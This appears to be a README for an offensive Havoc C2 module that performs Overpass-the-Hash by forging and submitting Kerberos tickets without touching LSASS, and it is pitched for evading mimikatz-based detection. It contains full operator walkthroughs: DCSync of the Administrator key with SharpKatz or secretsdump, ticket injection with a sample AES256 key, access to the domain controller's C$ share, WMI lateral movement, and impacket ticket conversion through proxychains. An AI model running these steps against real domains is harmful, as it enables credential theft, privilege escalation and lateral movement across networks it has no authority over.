# overpass — Overpass-the-Hash via Kerberos ticket submission

A credential-impersonation primitive that **doesn't touch LSASS memory**.
Two attack paths, one module:

1. **`overpass`** — self-contained Overpass-the-Hash. Given an account's
   AES256 key, it performs a Kerberos AS-REQ directly from the target,
   parses the AS-REP, decrypts the enc-part, builds a KRB-CRED and submits
   the TGT into the Demon's current logon session. **No impacket, no
   Rubeus, no LSASS writes.**
2. **`overpass_file`** — submit a pre-built `.kirbi` (KRB_CRED blob) shipped
   from the operator's filesystem. Fallback for when TCP:88 egress from the
   target isn't available.

Both use the public `LsaCallAuthenticationPackage(KerbSubmitTicketMessage)`
API, so they work on every Windows build (including Server 2025 / 11 26100
where mimikatz pth's kerberos struct offsets break) — documented LSA
primitives only, no mimikatz internals.

Pairs with the `pth` module: pth works for NTLM/SMB-by-IP; `overpass` works
for Kerberos/SMB-by-hostname. Different attack primitives, different Windows
auth paths.

## Commands

| Command          | Purpose                                                          |
|------------------|------------------------------------------------------------------|
| `overpass`       | Self-contained AS-REQ → TGT → submit to current LUID             |
| `overpass_file`  | Submit a pre-built `.kirbi` from the operator's filesystem       |
| `overpass_purge` | Purge current LUID's Kerberos ticket cache (revert)              |

## Files

```
overpass/
├── overpass.py          Havoc client wrapper (registers the 3 commands)
├── BOF/
│   ├── beacon.h
│   └── makefile         Builds all BOFs for both archs with `make`
├── source/
│   ├── overpass.c       Self-contained AS-REQ / AS-REP parse / KRB-CRED build
│   ├── kerb_ptt.c       Submit a raw KRB_CRED blob into current LUID
│   └── kerb_purge.c     Clear current LUID's ticket cache (revert)
└── bin/
    ├── overpass.x64.o   overpass.x86.o
    ├── kerb_ptt.x64.o   kerb_ptt.x86.o
    └── kerb_purge.x64.o kerb_purge.x86.o
```

`overpass.c` implements, from scratch against RFC 4120 / 3961 / 3962:

- AES256-CTS-HMAC-SHA1-96 (RFC 3962) via CNG bcrypt
- `nfold` + `DK` key derivation (RFC 3961 §5.1)
- ASN.1/DER writer+reader (explicit context tags, matching impacket)
- AS-REQ build (ENC-TIMESTAMP pre-auth), AS-REP parse, EncASRepPart decrypt
- KRB-CRED build (NULL-encrypted enc-part, session key in KrbCredInfo)
- `KerbSubmitTicketMessage` submission (message type 20)

## Workflow — path A: self-contained (no external tools)

You only need the target account's AES256 key. One-time, from your current
ADmin-adjacent session (DCSync):

```
Demon » dotnet inline-execute SharpKatz.exe --Command dcsync --User Administrator --Domain halcyon.local --DomainController halcyondc.halcyon.local
# or from Linux through SOCKS: proxychains impacket-secretsdump -just-dc-user Administrator halcyon.local/...@halcyondc
```

Then Overpass straight from the Demon (needs TCP:88 egress to the DC):

```
Demon » overpass /user:Administrator /domain:halcyon.local /aes256:56baaf5139c4ed94b0b6c53a430daa705aa1ace929f2e685db4980e5b7ec2f51 /dc:halcyondc.halcyon.local

Demon » shell klist                               # verify TGT in LUID
Demon » shell dir \\HALCYONDC\C$                  # Kerberos auth as Administrator
Demon » shell dir \\HALCYONDC.halcyon.local\C$    # same
Demon » jump-exec wmi-proccreate halcyondc.halcyon.local "cmd.exe /c calc"
```

## Workflow — path B: external ticket (no TCP:88 from target)

When the target can't reach the DC on TCP/88, request and convert the ticket
from Linux through your SOCKS proxy, then ship it through `overpass_file`.

```
proxychains -q impacket-getTGT \
    -aesKey 56baaf5139c4ed94b0b6c53a430daa705aa1ace929f2e685db4980e5b7ec2f51 \
    halcyon.local/Administrator            # -> Administrator.ccache
proxychains -q impacket-ticketConverter Administrator.ccache Administrator.kirbi
```

```
Demon » overpass_file /path/to/Administrator.kirbi
Demon » shell klist
```

## Revert

```
Demon » overpass_purge
Demon » shell klist                               # empty again
```

## Why this beats pth on modern Windows

| Primitive          | NTLM path         | Kerberos path          | PPL impact | Build-sensitive        |
|--------------------|-------------------|------------------------|------------|------------------------|
| `pth /sacrificial` | works (via IP)    | broken (empty slot)    | writes     | yes (nt6 offsets)      |
| `pth /inplace`     | works (identity!) | broken on build 26100  | writes     | yes                    |
| `overpass`         | n/a               | **works everywhere**   | **none**   | **no — public LSA API**|

## Rebuilding

```
cd client/Modules/overpass/BOF
make clean && make
```
